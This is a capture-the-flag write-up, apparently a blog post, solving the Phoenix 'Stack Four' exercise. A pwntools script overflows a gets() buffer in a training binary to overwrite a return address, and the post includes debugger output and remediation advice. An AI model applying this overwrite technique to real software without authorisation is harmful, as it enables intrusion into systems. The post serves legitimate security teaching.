# :game_die: Phoenix Challenges - Stack Four. The Challenge

---

# Phoenix Challenges — Stack Four

## The Challenge

The challenge’s description and source code are located [here](https://exploit.education/phoenix/stack-four/). It and all other Phoenix binaries are located in the /opt/phoenix/amd64 directory. A previous post describes how to set up the Virtual Machine for these challenges, if that hasn’t been done already.

## The File

As in the previous challenges, the *Stack Four* file is an ELF 64-bit LSB executable with symbols included and compiled with x86–64 architecture. Please refer to the preceding *Stack* challenge writeups for how the file’s properties are examined and the implications thereof.

## Objective

The goal is to tamper with start_level()’s return address so that complete_level() is launched upon start_level()’s end. This will be done by providing crafted input into complete_level()’s buffer.

The objective is hinted at by a generously-provided printout

```
ret = __builtin_return_address(0);
printf("and will be returning to %p\n", ret);
```

Spoiler Alert: We’ll use it later.

## Related Concept

Understanding the Stack and ASLR is key.

We now introduce the notion of a *stack frame.* It is a section of the stack storing an invoked function’s data. Specifically, it stores

- Arguments passed by the caller (usually a function or operating system capability)

- Local variables

- Return address to the caller function

- The frame pointer to the preceding stack frame

Below is a diagram of one basic stack frame. Both the x86 and x86_64 instruction sets follow this scheme:

*Source: [Buffer Overflow Six: The Function Stack](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)*

The real magic occurs when we have a nested combination of executing functions. Suppose we have three functions: main(), foo(), and bar():¹

```
int main()
{
foo();
bar();
}
void foo()
{
// do something
bar();
}
void bar()
{
// do something
}
```

And execute main(). Here is how the stack memory frames get allocated and de-allocated throughout the execution lifetime:

*Source: [Call Stack Internals (Part 1)](https://loonytek.com/2015/04/28/call-stack-internals-part-1/)*

Whenever a function is called, the stack grows downwards and a new frame is initialized. When the function ends, the return address and saved base pointer to the preceding stack frame’s beginning are used to redirect execution flow to the caller. The used stack frame’s memory is freed for future use.

As demonstrated in the previous *Phoenix* Stack challenges, buffer overflow exploits involve passing more data than a receiving buffer can store. The excess data then spills over into adjacent memory and overwrites neighboring variables and pointers. A stack frame’s return address pointer can also be affected. Because tampering with its value can affect an executable’s control flow, a common anti-exploitation defense is a stack canary. It is a portion of memory between a frame’s local variables (which include overflowable buffers) and its return address.

*Source: [[Write-up] Bypassing Custom Stack Canary {TCSD CTF}](https://mayaseven.com/write-up-bypassing-custom-stack-canary-tcsd-ctf/)*

A canary is initialized with a randomly-generated value, which is also stored elsewhere in the operating system. After the function is completed *and before *the execution control flow is redirected to the frame’s return address, the operating system compares the canary to the stored original. If the two are not equal, a potential attack into the stack frame’s return address is detected. Execution is aborted.

## The Bug

All of *Stack Four’s* data is stored on the stack, with the declared *buffer* receiving console input. Excess data will spill past the *buffer*’s end downwards in the stack and affect the return address stored in the start_level() function’s stack frame. This will allow redirection of the flow of execution when the start_level() function ends to the complete_level() function.

## The Exploit

We first need to check if the binary has any anti-exploitation defenses. Time to unleash Pwntool’s *Checksec*!

```
nathan@nathan-VirtualBox:/opt/phoenix/amd64$ checksec stack-four
[*] '/opt/phoenix/amd64/stack-four'
Arch: amd64-64-little
RELRO: No RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x400000)
RWX: Has RWX segments
RPATH: b'/opt/phoenix/x86_64-linux-musl/lib'
```

None are enabled. Of particular importance is the PIE field indicating ASLR is disabled and the Stack field indicating the binary has no stack canaries. This means that all functions will be in the same memory locations *each time* the executable is run and there are *no stack canaries* protecting return addresses from overwrites. Nice.

Next step: finding the complete_level() function’s address. As explained in the Stack Three writeup, it can be found both with objectdump or Pwndbg. We’ll practice using Pwndbg as we’ll be using it extensively

```
nathan@nathan-VirtualBox:/opt/phoenix/amd64$ gdb stack-four
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from stack-four...
(No debugging symbols found in stack-four)
pwndbg> p complete_level
$1 = {<text variable, no debug info>} 0x40061d <complete_level>
```

The complete_level() function starts at 0x40061d. That’s where we need to redirect execution flow to.

We now disassemble the start_level() function in Pwndbg to find the last instruction’s location. A breakpoint placed there allows the exploit developer to inspect the binary’s control flow’s redirection flow.

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ gdb /opt/phoenix/amd64/stack-four
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from /opt/phoenix/amd64/stack-four...
(No debugging symbols found in /opt/phoenix/amd64/stack-four)
pwndbg> disassemble start_level
Dump of assembler code for function start_level:
0x0000000000400635 <+0>: push rbp
0x0000000000400636 <+1>: mov rbp,rsp
0x0000000000400639 <+4>: sub rsp,0x50
0x000000000040063d <+8>: lea rax,[rbp-0x50]
0x0000000000400641 <+12>: mov rdi,rax
0x0000000000400644 <+15>: call 0x400470 <gets@plt>
0x0000000000400649 <+20>: mov rax,QWORD PTR [rbp+0x8]
0x000000000040064d <+24>: mov QWORD PTR [rbp-0x8],rax
0x0000000000400651 <+28>: mov rax,QWORD PTR [rbp-0x8]
0x0000000000400655 <+32>: mov rsi,rax
0x0000000000400658 <+35>: mov edi,0x400733
0x000000000040065d <+40>: mov eax,0x0
0x0000000000400662 <+45>: call 0x400460 <printf@plt>
0x0000000000400667 <+50>: nop
0x0000000000400668 <+51>: leave
0x0000000000400669 <+52>: ret
End of assembler dump.
```

Cool. We need to place a breakpoint at the 0x00400669 address!

The time has come to start crafting the exploit. This will take some time compared to previous challenges; we’ll need to do some debugging. The preliminary code is as follows:

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ cat exploit.py
#!/usr/bin/env python3
#
from pwn import *
#
# Need to set the pwntools "context" context for controlling
# many settings in pwntools library's capabilities
#
# The context is for little-endian AMD64 architecture running on Linux OS
#context.update(arch='amd64', os='linux')
#
#################################################################################
#
# Preparing the exploit's payload
payload = cyclic(100)
#
#################################################################################
#
# Launching exploit!
print("Launching The Stack Four Exploit!")
#
# The env={} to ensure the execution environment doesn't have any environmental variables
# This is comprehensively explained in the writeup to the "Stack Two" Phoenix challenge
p = process(["stack-four"], env={}, cwd="/opt/phoenix/amd64")
gdb.attach(p,'''
echo "hi"
break *0x00400669
continue
''')
#
# Sending the command-line inputted payload into the executing stack-three process
p.sendline(payload)
#
# Making the process interactive so users can
# interact with the process via its terminal!
p.interactive()
```

[The hint](https://exploit.education/phoenix/stack-four/) that “the saved instruction pointer is not necessarily after the end of variable allocations — things like compiler padding can increase the size” explains why we prepared an initial 100-character payload with the `cyclic(100)` command. 100 characters should be enough to fill the 64-character buffer and spill over into the stack frame’s return address, even if it is not immediately after the start_level() function’s last variable. Because each sequence of four characters has a unique index, we can perform the appropriate debugging and determine how long the payload actually needs to be. We also attached Pwndbg to the launched process and inserted a breakpoint on the start_level() function’s last instruction at 0x00400669.

## Get Nathan Pavlovsky’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

To run the script and start debugging, we first open the [tmux utility](https://www.redhat.com/sysadmin/introduction-tmux-linux)

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ tmux
```

It allows users to split our shell session into multiple screens. In this case, we will have two simultaneous screens: one for code execution and the other for debugging. Pwntools script with Pwdbg attached *cannot work if not run in a tmux session.*

We then launch the program — and hit the breakpoint

The disassemble start_level debugger command confirms that we are at the start_level() function’s last instruction [notice the => arrow in the output].

Looking at the top console session, our console printout indicates that we are returning to the `0x6161617861616177` hexadecimal address location. The repeated presence of the `61` character group looks non-incidental, so let’s see what the hex means in ASCII. Going to [www.rapidtables.com](https://secnate.github.io/ctf/phoenix/phoenix-stack-four/www.rapidtables.com) and inputting `0x6161617861616177`, we get `aaaxaaaw`.

Nice. `aaaxaaaw` is part of the long cyclical string that we generated in Pwntools with `cyclic(100)` – and we successfully overwrote the return address!

Our goal is to prepare a padding string of appropriate length so that the test `0xdeadbeef` value completely overwrites the stack frame’s return address. We now need to determine how long the generated string needs to be before we hit `aaax` and `aaaw`. Pwntools can help:

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ cyclic -l aaax
89
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ cyclic -l aaaw
85
```

The payload needs to have somewhere between 85 and 89 padding characters before passing in the actual address. Because the binary’s word size is 64 bits or 8 bytes and each ASCII character is a byte, we need the padding string to be of a length that is a multiple of 8. The only number that is a multiple of 8 between 85 and 89 is 88 — so let’s give it a shot.

We quit the debugger and program execution, open the *exploit.py* file, and change the line declaring the payload variable to

```
payload = cyclic(88) + p64(0xdeadbeef)
```

The p64 instruction converts `0xdeadbeef` to a byte string representation of length 64 bits (the binary’s word size) of the appropriate endianness.

Now, to open tmux and launch the exploit again:

It works! Both the debugger and console output indicate we have successfully overwritten the stack frame’s return address with `0xdeadbeef` and are successfully redirecting execution flow.

Time to open *exploit.py* and replace `0xdeadbeef` with the `complete_level()`function’s starting address:

```
payload = cyclic(88) + p64(0x40061d)
```

Let’s open tmux again and launch the exploit:

Just like previously, we break on the `start_level()` function’s last instruction. Both the printout and debugger indicate that the next instruction to be executed will be `complete_level()`’s first line at `0x40061d`.

Let’s verify that this will be the case. In the debugger, we enter `n` to step to the next instruction. We get

And entered the `complete_level()` function without any errors firing.

Let’s see if `complete_level()`’s remaining instructions execute just as smoothly. We enter `c` (which stands for “continue”) in the debugger

Voila! We got the desired message.

The final step is to verify the exploit for stability. We will do this by deleting the debugging-related code from the code

```
gdb.attach(p,'''
echo "hi"
break *0x00400669
continue
''')
```

And checking if it runs fine without Pwndbg being attached

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ ./exploit.py
Launching The Stack Four Exploit!
[!] Could not find executable 'stack-four' in $PATH, using '/opt/phoenix/amd64/stack-four' instead
[+] Starting local process '/opt/phoenix/amd64/stack-four': pid 12928
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-four' stopped with exit code 0 (pid 12928)
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
[*] Got EOF while reading in interactive
$
```

Congratulations! We solved the challenge!

The exploit code can be found in my [Github repository](https://github.com/secnate/Exploit-Education-CTFs) for Phoenix challenge solutions.

## Remediation

To eliminate such a bug, I would urge developers to dump memory insecure languages like C and C++ once and for all. Please.

If there is no choice but to use C, the [gets()](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm) function needs to end up on the dustbin of history. Use [fgets()](https://cplusplus.com/reference/cstdio/fgets/) instead. Previous *Phoenix Stack* challenges explain in detail why it is preferable.

The source code’s gets(buffer); line should thus be

```
fgets(buffer, 64, stdin);
```

---
